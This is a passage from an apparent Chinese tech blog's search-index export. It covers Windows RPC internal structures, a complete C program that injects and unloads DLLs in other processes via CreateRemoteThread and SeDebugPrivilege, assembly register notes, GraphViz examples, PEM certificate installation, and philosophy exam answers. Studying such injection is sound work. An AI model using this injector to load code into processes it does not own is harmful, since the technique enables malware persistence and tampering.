ModuleSectionInfo.pBase获取 RpcServer] D --> E[通过获取的 RpcServer 与 RpcInterface \\n比较判断当前进程是否为 RPCserver] 上述流程就获取到了一个进程中是否含有RPC服务，并且如果有的话，可以借 RPCserver 获取RPC的相关信息。 pRpcCoreInternalCtxt 结构体 1234typedef struct _RpcCoreInternalCtxt_T&#123; VOID* pGlobalRpcServer; UINT64 ModuleVersion;&#125;RpcCoreInternalCtxt_T; ModuleSectionInfo 结构体 1234typedef struct _ModuleSectionInfo_T&#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T; RpcServer 结构体 1234567891011121314151617181920212223242526272829typedef struct _RPC_SERVER_T&#123; MUTEX_T MUTEX; ULONG Unk1; ULONG Unk2; BOOL bIsListening; ULONG MinimumCallThreads; ULONG bWait; ULONG OutCalls; ULONG Unk3; ULONG InCalls; SIMPLE_DICT_T AddressDict; ULONG Unk3_; SIMPLE_DICT_T _ProtSeqQueue; ULONG Unk4[4]; ULONG OutPackets; ULONG Unk5; MUTEX_T Mutex2; ULONG MaxCalls; VOID PTR_T hEvent; ULONG Unk6[6]; SIMPLE_DICT_T InterfaceDict; BOOL ___bIsListening; BOOL bIsListenMaxCallsDefault; ULONG Unk7[6]; ULONG InPackets; RPC_FORWARD_FUNCTION PTR_T pRpcForwardFunction; ULONG Unk8[6]; SIMPLE_DICT_T AuthenInfoDict;&#125;RPC_SERVER_T, PTR_T PRPC_SERVER_T; RpcInterface 结构体如下所示： 123456789101112131415161718192021typedef struct _RPC_INTERFACE_T&#123; RPC_SERVER_T PTR_T pRpcServer; ULONG Flags; ULONG EpMapperFlags; RPC_MGR_EPV PTR_T pMgrEpv; RPC_IF_CALLBACK_FN PTR_T IfCallbackFn; RPC_SERVER_INTERFACE_T RpcServerInterface; ULONG pSyntaxInfo; ULONG pTransfertSyntaxes; ULONG pTransfertSyntaxesCount; ULONG Unk1; ULONG NbTypeManager; ULONG MaxRpcSize; ULONG Unk2; ULONG pUuidVector; SIMPLE_DICT_T RpcInterfaceManagerDict; UCHAR Annotation[MAX_RPC_INTERFACE_ANNOTATION]; SIMPLE_DICT_T FwEpDict; ULONG Unk3[6];&#125;RPC_INTERFACE_T, PTR_T PRPC_INTERFACE_T; 0x03 RpcCore本章主要描述上述检测流程，以及rpcview是如果工作拿到相关信息的。 NDR 相关可查官方文档：MIDL_STUB_DESC (rpcndr.h) - Win32 apps | Microsoft Learn","tags":[{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"RPC","slug":"A-OS/Windows/RPC","permalink":"http://example.com/categories/A-OS/Windows/RPC/"}]},{"title":"【API】远程加载和释放DLL","date":"2023-11-05T16:00:00.000Z","path":"A_OS/Windows/API/CreateRemoteThread/【API】远程加载和释放DLL/","text":"概述：远程加载和释放DLL，仅记录学习笔记，无参考意义。 CreateRemoteThread 的用法参考文章 CreateRemoteThread的简单使用 说明主要就是在目标进程中调用 LoadLibrary 和 FreeLibrary 这两个函数。没有什么技术含量，会以下几个API就可以 CreateRemoteThread LoadLibrary Freelibrary OpenProcess VirtualAllocEx GetProcAddress CreateToolhelp32Snapshot 注意点卸载dll时需要判断dll是否存在。 需要调用 CreateToolhelp32Snapshot 通过 MODULEENTRY32 枚举进程加载的模块有哪些。MODULEENTRY32 结构体如下所示 szModule：模块名 szExePath：模块加载的路径 123456789101112131415typedef struct tagMODULEENTRY32&#123; DWORD dwSize; DWORD th32ModuleID; // This module DWORD th32ProcessID; // owning process DWORD GlblcntUsage; // Global usage count on the module DWORD ProccntUsage; // Module usage count in th32ProcessID&#x27;s context BYTE * modBaseAddr; // Base address of module in th32ProcessID&#x27;s context DWORD modBaseSize; // Size in bytes of module starting at modBaseAddr HMODULE hModule; // The hModule of this module in th32ProcessID&#x27;s context char szModule[MAX_MODULE_NAME32 + 1]; char szExePath[MAX_PATH];&#125; MODULEENTRY32;typedef MODULEENTRY32 * PMODULEENTRY32;typedef MODULEENTRY32 * LPMODULEENTRY32; Code代码部分分别封装了两个函数 InjectDll 和 FreeDll。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#pragma comment(lib,&quot;Advapi32.lib&quot;) BOOL InjectDll(UINT32 ProcessId, char *DllPath)&#123; if (strstr(DllPath, &quot;\\\\\\\\&quot;) != 0) &#123; printf(&quot;[!]Wrong Dll path\\n&quot;); return FALSE; &#125; if (strstr(DllPath, &quot;\\\\&quot;) == 0) &#123; printf(&quot;[!]Need Dll full path\\n&quot;); return FALSE; &#125; size_t len = strlen(DllPath) + 1; LPVOID pThreadData = NULL; HANDLE ProcessHandle = NULL; HANDLE hThread = NULL; BOOL bRet = FALSE; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; pThreadData = VirtualAllocEx(ProcessHandle, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pThreadData == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]VirtualAllocEx error\\n&quot;); __leave; &#125; BOOL bWriteOK = WriteProcessMemory(ProcessHandle, pThreadData, DllPath, len, NULL); if (!bWriteOK) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]WriteProcessMemory error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;LoadLibraryA&quot;); hThread = CreateRemoteThread(ProcessHandle, NULL, 0, LoadLibraryAddress, pThreadData, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (pThreadData != NULL) VirtualFreeEx(ProcessHandle, pThreadData, 0, MEM_RELEASE); if (hThread != NULL) CloseHandle(hThread); if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125;BOOL FreeDll(UINT32 ProcessId, char *DllFullPath)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot; HMODULE hModule = NULL; MODULEENTRY32 me = &#123; sizeof(me) &#125;; BOOL bSuccess = FALSE; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, ProcessId); bMore = Module32First(hSnapshot, &amp;me); for (; bMore; bMore = Module32Next(hSnapshot, &amp;me)) &#123; if (!_tcsicmp((LPCTSTR)me.szModule, DllFullPath) || !_tcsicmp((LPCTSTR)me.szExePath, DllFullPath)) &#123; bFound = TRUE; break; &#125; &#125; if (!bFound) &#123; CloseHandle(hSnapshot); return FALSE; &#125; BOOL bRet = FALSE; HANDLE ProcessHandle = NULL; __try &#123; ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId); if (ProcessHandle == NULL) &#123; printf(&quot;[!]OpenProcess error\\n&quot;); __leave; &#125; LPTHREAD_START_ROUTINE FreeLibraryAddress = NULL; HMODULE Kernel32Module = GetModuleHandle(&quot;Kernel32&quot;); FreeLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32Module, &quot;FreeLibrary&quot;); HANDLE hThread = NULL; hThread = CreateRemoteThread(ProcessHandle, NULL, 0, FreeLibraryAddress, me.modBaseAddr, 0, NULL); if (hThread == NULL) &#123; CloseHandle(ProcessHandle); printf(&quot;[!]CreateRemoteThread error\\n&quot;); __leave; &#125; WaitForSingleObject(hThread, INFINITE); bRet = TRUE; &#125; __finally &#123; if (ProcessHandle != NULL) CloseHandle(ProcessHandle); &#125; return bRet;&#125;BOOL EnableDebugPrivilege(BOOL fEnable)&#123; BOOL fOk = FALSE; HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid); tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0; AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL); fOk = (GetLastError() == ERROR_SUCCESS); CloseHandle(hToken); &#125; return(fOk);&#125;int main(int argc, char *argv[])&#123; if (argc != 3) &#123; printf(&quot;Use CreateRemoteThread to inject dll,usually used under XP.\\n\\n&quot;); printf(&quot;Usage:\\n&quot;); printf(&quot;%s &lt;PID&gt; &lt;Dll Path&gt;\\n&quot;, argv[0]); return 0; &#125; if (!EnableDebugPrivilege(TRUE)) &#123; printf(&quot;[!]AdjustTokenPrivileges Failed.&lt;%d&gt;\\n&quot;, GetLastError()); &#125; if (!InjectDll((DWORD)atoi(argv[1]), argv[2])) &#123; printf(&quot;[!]InjectDll error \\n&quot;); return 1; &#125; if (!FreeDll((DWORD)atoi(argv[1]), argv[2])) &#123; printf(&quot;[!]FreeDll error \\n&quot;); return 1; &#125; printf(&quot;[+]InjectDll success\\n&quot;); return 0;&#125;","tags":[{"name":"API","slug":"API","permalink":"http://example.com/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"http://example.com/categories/A-OS/Windows/API/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"http://example.com/categories/A-OS/Windows/API/CreateRemoteThread/"}]},{"title":"【汇编】寄存器相关.md","date":"2023-11-02T16:00:00.000Z","path":"B_Code/汇编/【汇编】寄存器相关/","text":"概述：寄存器相关整理 [toc] 段寄存器CS存放当前正在运行的程序代码所在段的段基址，表示当前使用的指令代码可以从该段寄存器指定的存储器段中取得，相应的偏移量则由IP提供。 SSDSESFS&#x3D;&#x3D;fs&#x3D;&#x3D; 是 &#x3D;&#x3D;80386&#x3D;&#x3D; 起增加的两个辅助段寄存器之一,在这之前只有一个辅助段寄存器ES FS寄存器指向当前活动线程的TEB结构（线程结构） 偏移 说明 00 只想SEH链表指针 04 线程堆栈顶部（地址最小） 08 线程堆栈底部（地址最大） 0c SubSystemTib 10 FiberData 14 ArbitraryUserPointer 18 FS 段寄存器在内存中的镜像 20 进程PID 24 线程ID 2c 指向线程局部存储的指针 30 PEB结构地址（进程结构） 34 上一个错误（LastError) GS","tags":[{"name":"汇编","slug":"汇编","permalink":"http://example.com/tags/%E6%B1%87%E7%BC%96/"},{"name":"寄存器","slug":"寄存器","permalink":"http://example.com/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"汇编","slug":"B-Code/汇编","permalink":"http://example.com/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"【工具】使用 GraphViz 画图","date":"2023-11-01T02:50:09.593Z","path":"G_工具/Graphviz画图/","text":"概述：使用 GraphViz 画图 Example: Graphviz (dot) examples [toc] Dot命令dot渲染成其他文件命令： Command Line | Graphviz 1dot -Tsvg input.dot 中文乱码问题需要设置字体 1fontname=&quot;Microsoft Yahei&quot; AttributesAttributes | Graphviz clusterWhether the subgraph is a cluster 1234567891011121314151617181920212223digraph cats &#123; subgraph cluster_big_cats &#123; // This subgraph is a cluster, because the name begins with &quot;cluster&quot; &quot;Lion&quot;; &quot;Snow Leopard&quot;; &#125; subgraph domestic_cats &#123; // This subgraph is also a cluster, because cluster=true. cluster=true; &quot;Siamese&quot;; &quot;Persian&quot;; &#125; subgraph not_a_cluster &#123; // This subgraph is not a cluster, because it doesn&#x27;t start with &quot;cluster&quot;, // nor sets cluster=true. &quot;Wildcat&quot;; &#125;&#125; colorschemeA color scheme namespace: the context for interpreting color names 123456789101112graph &#123; node [colorscheme=oranges9] # Apply colorscheme to all nodes 1 [color=1] 2 [color=2] 3 [color=3] 4 [color=4] 5 [color=5] 6 [color=6] 7 [color=7] 8 [color=8] 9 [color=9]&#125; compoundIf true, allow edges between clusters 123456789101112131415161718digraph &#123; compound=true; subgraph cluster_a &#123; label=&quot;Cluster A&quot;; node1; node3; node5; node7; &#125; subgraph cluster_b &#123; label=&quot;Cluster B&quot;; node2; node4; node6; node8; &#125; node1 -&gt; node2 [label=&quot;1&quot;]; node3 -&gt; node4 [label=&quot;2&quot; ltail=&quot;cluster_a&quot;]; node5 -&gt; node6 [label=&quot;3&quot; lhead=&quot;cluster_b&quot;]; node7 -&gt; node8 [label=&quot;4&quot; ltail=&quot;cluster_a&quot; lhead=&quot;cluster_b&quot;];&#125; concentrateIf true, use edge concentrators 123456digraph &#123; concentrate=true a -&gt; b [label=&quot;1&quot;] c -&gt; b d -&gt; b&#125; constraintIf false, the edge is not used in ranking the nodes 12345digraph G &#123; a -&gt; c; a -&gt; b; b -&gt; c [constraint=false];&#125; 使用GraphVia画结构体使用DEMO12345678digraph structs &#123; node [shape=record]; struct1 [label=&quot;&lt;f0&gt; left|&lt;f1&gt; mid&amp;#92; dle|&lt;f2&gt; right&quot;]; struct2 [label=&quot;&lt;f0&gt; one|&lt;f1&gt; two&quot;]; struct3 [label=&quot;hello&amp;#92;nworld |&#123; b |&#123;c|&lt;here&gt; d|e&#125;| f&#125;| g | h&quot;]; struct1:f1 -&gt; struct2:f0; struct1:f2 -&gt; struct3:here;&#125;","tags":[],"categories":[{"name":"G_工具","slug":"G-工具","permalink":"http://example.com/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"【证书】安装PEM文件","date":"2023-10-27T01:24:02.562Z","path":"Z_杂记/安装PEM文件/","text":"概述： windows和Linux安装PEM文件步骤 [toc] 如何安装PEM证书更新：2023-05-29 21:11 PEM证书是一种常见的证书文件格式，通常用于加密、验证和身份认证等。在运行应用程序或服务时，有时需要将PEM证书安装到系统或设备中，并确保其正确配置。本文将介绍如何安装PEM证书。 1. 下载PEM证书文件首先，您需要有PEM证书文件。它可以是自签名证书、客户端或服务器证书、根证书或中间证书。您可以从许多来源获取PEM证书文件，例如： 证书颁发机构 (CA) 厂商提供的PEM证书 自己创建的PEM证书文件 确保您已经获得PEM证书文件并将其下载到计算机的本地文件夹中。 2. 安装PEM证书文件2.1 在Linux系统上安装PEM证书如果您想在Linux系统上安装PEM证书，可以使用以下步骤： 12sudo cp server.crt /usr/local/share/ca-certificates/sudo update-ca-certificates 在上述命令中，“server.crt”是您的PEM证书文件名。通过将PEM证书文件复制到“&#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F;”目录，您可以将PEM证书添加到系统的可信证书列表中。接下来，运行“sudo update-ca-certificates”命令以更新证书列表并使其生效。 2.2 在Windows系统上安装PEM证书 方式一 如果您想在Windows系统上安装PEM证书，可以使用以下步骤： 双击PEM证书文件，打开证书向导。 在弹出窗口中，选择“安装证书”选项，并单击“下一步”。 选择“计算机帐户”选项，并单击“下一步”。 在“选择存储位置”窗口中，选择“受信任的根证书颁发机构”选项，并单击“下一步”。 单击“下一步”以确认选项，并单击“完成”以完成证书安装。 现在，您的PEM证书已经安装在您的Windows系统中。 方式二 1打开控制面板 -&gt; 网络设置 -&gt; Internet选项 -&gt; 内容 -&gt; 证书 -&gt; 导入 然后选择你需要安装的证书导入即可。 方式三 打开“开始”菜单，搜索“mmc”并打开“Microsoft Management Console”。 点击“文件”菜单，选择“添加&#x2F;删除管理单元”。 在“可用的管理单元”列表中，选择“证书”并点击“添加”。 选择“计算机帐户”并点击“下一步”。 选择“本地计算机”并点击“完成”。 在“控制台根证书存储”下，右键点击“受信任的根证书颁发机构”并选择“所有任务” &gt; “导入”。 点击“下一步”，浏览到您的Pem证书文件并选择它。 点击“下一步”，选择“将所有证书都放置在下列存储中”并点击“浏览”。 选择“受信任的根证书颁发机构”并点击“确定”。 点击“下一步”并完成证书安装。 3. 使用PEM证书文件一旦您已经安装了PEM证书，您可以开始使用它。通常，您需要在应用程序或服务的配置文件中指定PEM证书的路径或名称。以下是一些示例： 1234567ssl_certificate /path/to/your/cert.pem;// For Node.js serverconst server = https.createServer(&#123; key: fs.readFileSync(&#x27;server.key&#x27;), cert: fs.readFileSync(&#x27;server.cert&#x27;)&#125;); 以Nginx Web服务器和Node.js服务器为例，您可以将PEM证书文件路径或名称指定为“ssl_certificate”或“cert”选项的值。 结论在本文中，您已了解如何安装PEM证书文件并在应用程序或服务中使用它们。无论您要在哪个平台上安装PEM证书，都需要按照相应的步骤来执行。","tags":[{"name":"证书","slug":"证书","permalink":"http://example.com/tags/%E8%AF%81%E4%B9%A6/"},{"name":"PEM","slug":"PEM","permalink":"http://example.com/tags/PEM/"}],"categories":[{"name":"Z_杂记","slug":"Z-杂记","permalink":"http://example.com/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"自然辩证法","date":"2023-10-27T01:24:02.562Z","path":"Z_杂记/自然辩证法/","text":"概述：自然辩证法 参考链接：2019自然辩证法课后思考题及答案_文档之家 [toc] 第一章 自然辩证法（byself）1.如何理解朴素唯物主义自然观、机械唯物主义自然观和辩证唯物主义自然观的辩证关系？（1）古代朴素自然观以直观性、思辨性和猜测性的方式从整体把握认识自然界的本源和发展，但缺乏系统的、以实验为基础的科学依据，尤其是将非物质性的东西当做限于物质世界的独立存在，并认为物质世界是它的派生物，为唯心主义的产生提供了借口，最终导致人类认识的分化。 （2）机械唯物主义自然观的核心是自然界绝对不变，虽然在实证科学的基础上继承和坚持了古代朴素唯物主义的思想，但是不懂得一般与个别、运动和静止等的辩证关系，以一种片面的、孤立的和静止的方法观察自然界，挤不动的自然界的辩证法，自然不能吧唯物主义坚持到底。 （3）辩证唯物主义自然克服了以往哲学自然观的缺陷，坚持了物质世界的客观实在性的唯物主义一元论原则，突出了物质世界的整体性和矛盾性，提示了物质世界的普遍联系，强调了人类起源于自然界、依赖于自然并在把握自然界发展规律的基础上能移动地和改造自然，强调了人与自然界的和谐统一。 2.如何理解系统自然观、人工自然观和生态自然观的辩证关系？第一，它们都围绕人与自然界关系的主题，丰富和发展了马克思注意自然观的本体论、认识论和方法论；它们都坚持人类与自然界、人工自然界和天然自然界、人与生态系统的辩证统一，都为实现可持续发展和生态文明建设奠定了理论基础。 第二，它们在研究人与自然界关系的各方面各有其侧重点；系统自然观为正确认识和处理人与自然地关系提供了新的思维方式，人工自然观突出并反思了人的主体性和创造性；自然生态馆站在人类文明的立场，强调了人与自然界的协调与发展。 第三，它们在研究人与自然界的关系方面相互关联；系统自然观通过系统思维方式，为人工自然观和生态自然观提供了方法论基础；人工自然观通过突出人的主体性和实践性，为系统自然观和生态自然观提供了认识论前提；生态自然观通过强调人与自然界的统一性、协调性关系为系统自然观和人工自然观指明了发展方向和目标。 3.如何认识生态自然观和生态文明建设之间的辩证关系？生态文明是人类文明的一种形式。它以尊重和维护生态环境为主旨，以可持续发展为根据，以未来人类的继续发展为着眼点。人类对生态文明的探索，是对人与自然和谐关系的表现。生态文明与生态自然观有着紧密的联系，生态文明是生态自然观的应有之义，生态自然观对现今世界生态文明发展及实践有着广泛的指导意义。生态文明的提出，是人们对可持续发展问题认识深化的必然结果。人类通过遵守可持续性、共同性和公平性等原则，通过实施节能减排和发展低碳经济，构建和谐社会和建设生态文明，实现人类社会与生态系统的协调发展；人与生态系统的协调发展仍应以人类为主体，仍应包括改造自然的内容，注重保护生态环境和防灾减灾；生态自然界是天然自然界和人工自然界的统一，是人类文明发展的目标，生态文明的提出，是人们对可持续发展问题认识深化的必然结果。生态自然观指出，人与自然都是生态系统中不可或缺的重要组成部分，人与自然是相互依存、和谐共处、共同促进的关系。人类的发展应该是人与社会、人与环境、当代人与后代人的协调发展。人类的发展不仅要讲究代内公平，而且要讲究代际之间的公平，不能以当代人的利益为中心，甚至为了当代人的利益而不惜牺牲后代人的利益。而必须讲究生态文明，牢固树立起可持续发展的生态文明观。 4.如何理解“绿水青山就是金山银山”？简单的来说，”绿水青山就是金山银山”就是指生态可持续发展。蓝天白云、青山绿水是人类赖以生存的环境，是社会长远发展的最大本钱，生态优势可以变成经济优势、发展优势，形成了一种浑然一体、和谐统一的关系。因此保护绿水青山，才能保住人们赖以生存的生态环境，从而赢得长远的经济可持续发展。 习近平总书记关于绿水青山就是金山银山的辩证论是生态环境生产力理论生动、朴实和富含哲理的印证：“绿水青山可以源源不断地带来金山银山，绿水青山本身就是金山银山，我们种的常青树就是摇钱树，生态优势变成经济优势。” “如果能够把这些生态环境优势转化为生态农业、生态工业、生态旅游等生态经济的优势，那么绿水青山也就变成了金山银山。”当然，绿水青山和金山银 山之间也有矛盾，绿水青山是真正的金不换，“绿水青山可带来金山银山，但金山银山却买不到绿水青山”。 因此，当绿水青山和金山银山之间有不可调和的矛盾时，我们宁要绿水青山，不要金山银山。要像对待生命一样对待生态环境，统筹山水林田湖草系统治理，实行最严格的生态环境保护制度，形成绿色发展方式和生活方式，坚定走生产发展、生活富裕、生态良好的文明发展道路，建设美丽中国。 绿水青山就是金山银山的理念，一头是人类赖以生存的自然环境，另一头牵着财富生产；一头连着生态环境，另一头是人类活动的产物。从人与自然是生命共同体出发，将生态环境内化为生产力的内生变量与价值目标，蕴含着尊重自然、顺应自然、保护自然，谋求人与自然和谐发展的生态理念和价值诉求。 揭示了生态环境与生产力之间的辩证统一关系，突破了把保护生态与发展生产力对立起来的僵化思维，内含了保护、改善与建设生态环境和保护与发展生产力的有机统一，鲜活地概括了有中国气派、中国风格和中国话语特色的绿色发展内涵，是中国化马克思主义理论的光辉典范。 第一章 自然辩证法1.如何理解朴素唯物主义自然观、机械唯物主义自然观和辩证唯物主义自然观的辩证关系？朴素唯物主义自然观是古代自然哲学家们以科学技术为基础，概括和总结自然界及其与人类的关系形成的总的观点。它是马克思主义自然观形成的最初思想渊源。它具有①整体性和直观性，②思辨性和臆测性，③自发性和不彻底性。朴素唯物主义自然观的思想渊源是原始宗教神话自然观，其理论基础是自然哲学。朴素唯物主义自然观具有一定的缺陷：①不能彻底地坚持唯物主义，具有唯心主义因素，如泰勒斯的”水本原说”②不能满足民众的需要，掺杂着宿命和迷信等因素。③不能科学地说明自然界。 机械唯物主义自然观是近代自然科学家们以近代科学技术为基础，概括和总结自然界及其与人类的关系形成的总的观点。它是马克思主义自然观形成的重要思想渊源。它具有①机械性②不彻底性③形而上学性。机械唯物主义自然观①为辩证唯物主义自然观的形成创造了条件。他以近代自然科学为基础，强调自然界存在的客观性，物质性和发展的规律性，传承了朴素唯物主义自然观的思想传统。③为辩证唯物主义自然观的形成提供了前提。它所培植的崇尚理性的科学精神促进了辩证唯物主义自然观的形成。 辩证唯物主义自然观是马克思恩格斯以近代科学技术为基础，概括和总结自然界及其与人类关系形成的总的观点。它是马克思主义自然观形成的重要标志。辩证唯物主义自然观具有①实践性②历史性③辩证性④批判性。辩证唯物主义自然观“扬弃”了机械唯物主义自然观，在更高层次上实现了向古希腊朴素唯物主义自然观的回归。 三种自然观的发展本质是人类认识的发展，辩证唯物主义自然观是对朴素唯物主义自然观的否定之否定，是对机械唯物主义自然观的否定。任何一种自然观的产生都脱离不了当时科学的发展水平，也离不开人们的认识水平。而更先进的自然观对科学的发展又具有指导性意义。这个发展是螺旋上升的，在我们的认识中还会进行补充和丰富，在运动中发展自己。 2.如何理解系统自然观、人工自然观和生态自然观的辩证关系？P42 3.如何认识生态自然观和生态文明建设之间的辩证关系？生态文明是人类文明的一种形式。它以尊重和维护生态环境为主旨，以可持续发展为根据，以未来人类的继续发展为着眼点。人类对生态文明的探索，是对人与自然和谐关系的表现。生态文明与生态自然观有着紧密的联系，生态文明是生态自然观的应有之义，生态自然观对现今世界生态文明发展及实践有着广泛的指导意义。生态文明的提出，是人们对可持续发展问题认识深化的必然结果。人类通过遵守可持续性、共同性和公平性等原则，通过实施节能减排和发展低碳经济，构建和谐社会和建设生态文明，实现人类社会与生态系统的协调发展；人与生态系统的协调发展仍应以人类为主体，仍应包括改造自然的内容，注重保护生态环境和防灾减灾；生态自然界是天然自然界和人工自然界的统一，是人类文明发展的目标，生态文明的提出，是人们对可持续发展问题认识深化的必然结果。生态自然观指出，人与自然都是生态系统中不可或缺的重要组成部分，人与自然是相互依存、和谐共处、共同促进的关系。人类的发展应该是人与社会、人与环境、当代人与后代人的协调发展。人类的发展不仅要讲究代内公平，而且要讲究代际之间的公平，不能以当代人的利益为中心，甚至为了当代人的利益而不惜牺牲后代人的利益。而必须讲究生态文明，牢固树立起可持续发展的生态文明观。 4.如何理解“绿水青山就是金山银山”？“绿水青山就是金山银山”的重要思想，触及到了一个人类社会发展的大难题，即：金山银山是人的物质追求，绿水青山是人赖以生存的自然条件，这两者都是人生存和发展所需要的，而这两者对于人来说又很难兼得。自工业革命以来，人类以牺牲绿水青山来实现自己的物质追求，曾经创造了前所未有的文明奇迹。但是，这种不可持续的经济增长方式造成了许多灾难性的后果，促使人们在对传统的增长方式和发展理论进行反思的同时，开始重新研究发展理论，重新研究发展中人与自然的关系。 以我国为例，我们在过去实行的是“先增长后治污”模式，在“两座山”问题上实际上是采取了“为了金山银山可以暂时牺牲绿水青山”的做法;后来认识到这样做不仅不可持续，而且治污的代价要大于增长获得的收益，于是许多地方提出了“宁要绿水青山，不要金山银山”的口号，即下决心改变“先增长后治污”的模式，优化环境，保护生态。这样的口号，这样的做法，虽然也讲“可持续发展”，但实际上是把“可持续”与“发展”割裂开来，这不利于生产力的发展。 “绿水青山就是金山银山”，则以“就是”一词把“绿水青山”和“金山银山”辩证地连接起来，以积极的而不是悲观的态度阐明了这两者之间的关系，讲清楚了发展中人与自然的辩证统一关系绿水青山就是金山银山”这一重要思想，所表达的则是环境、生态应该是社会生产力内部的一个有机组成部分。也就是说，习近平把环境、生态纳入了社会生产力的范畴。这种态度就是马克思主义的态度，这种认识就是马克思主义的认识。。 因此，我们说习近平关于“绿水青山就是金山银山”的重要思想，以一种新颖的发展理念，坚持和发展了马克思主义创始人以积极乐观的态度认识和处理发展中人与自然关系问题的科学思想。 5.简述辩证唯物主义自然观战胜机械论自然观的历史必然性。机械论自然观的产生有其历史的必然性和合理性，但它用孤立的，静止的，片面的观点去看待世界，否认事物的联系和发展变化，否认事物的内部矛盾。实践是检验真理的唯一标准，机械论自然观的这些特点与近代自然科学已经相悖，应当摒弃。人类社会的大趋势是发展，在目前的历史环境下，机械论自然观的存在只会阻碍这种发展，所以必将被适应当前自然科学的辩证唯物主义自然观所取代，这是历史必然性。 P28 第二章 科学技术观（byself）6.如何理解18.19世纪科学技术发展与马克思恩格斯科学技术思想产生的关系？p45 从18世纪60年代起始于英国的第一头次技术革命和继之而来的产业革命，既向科学提出了新的要求，也为科学提供了新的事实，更为科学提供了新的交流方法，从而使科学在19世纪获得了长足的进步，取得了影响深远的一些重要发现，为辩证唯物主义自然观的产生提供了丰富的物质基础 19世纪的自然科学成就为辩证唯物主义自然观产生提供了科学前提。如在天文学上，1755年康德和拉普拉斯（1796年）分别提出的关于太阳系起源的星去假设。在地质学上，英国科学家莱伊尔1830年发表“地球演化学说”，在物理学上焦耳发现能量转化和守恒定律，从而动摇了形而上学的基础，在化学上1824年由维等人合成尿素，在生物上，1838年施旺提出细胞是生命 的基本结构单位，1958年达尔文创立特种起源论，对于这些重要的发现，恩格斯经过反复研究，从自然观的高度提出了运动形式及其相互转化的学说。恩格斯关于运动形式的学说把蕴含在当时诸多科学发现中的思想精华作了概念性升华，从而提供了一种观察研究自然的哲学方式 综上所述，辩证唯物主义自然观的产生反映了科学技术发展的历史必然性。 7.怎样认识马克思恩格斯的科学技术思想在马克思主义理论体系中的重要地位？马克思主义理论体系，是关于全世界无产阶级和全人类彻底解放的学说。它由马克思主义哲学、马克思主义政治经济学和科学社会主义三大部分组成，是马克思、恩格斯在批判地继承和吸收人类关于自然科学、思维科学、社会科学优秀成果的基础上于19世纪40年代创立的，并在实践中不断地丰富、发展和完善的无产阶级思想的科学体系。 马克思恩格斯科学技术思想表明了科学技术是推动社会发展的革命力量，通过对科学技术的理解、科学的分类、科学技术与哲学的关系、科学技术是生产力、科学技术的生产动因、科学技术的社会功能、科学技术与社会制度、科学与技术的相互关系、科学技术异化等方面观点的阐述，极大的丰富和发展了马克思主义理论，有助于指导我们正确分析科学技术及其发展的理论和现实问题。 8.马恩与国外学者关于科技的本质区别p51-559.如何理解科学技术一体化的特征？在人类历史上，科学与技术经历了几次分合。科学与技术源起于人类的社会生产实践，本来是内在统一的，但随着生产力的发展，出现了脑力劳动与体力劳动的分工，一部分人从单纯的体力劳动中分化出来，专门从事政治、宗教、艺术、哲学等活动，科学与技术从此分道扬镳，科学活动由学者们承担，技术研究则由工匠们掌握。在古代，科学对技术的影响甚微，无论是自然经济条件下的农业技术，还是工匠的手工业技术，都是凭经验掌握和积累的，那时几乎没有以科学的应用为特征的技术，而只有手艺、技能——尽管这些经验可能发展到惊人的水平。 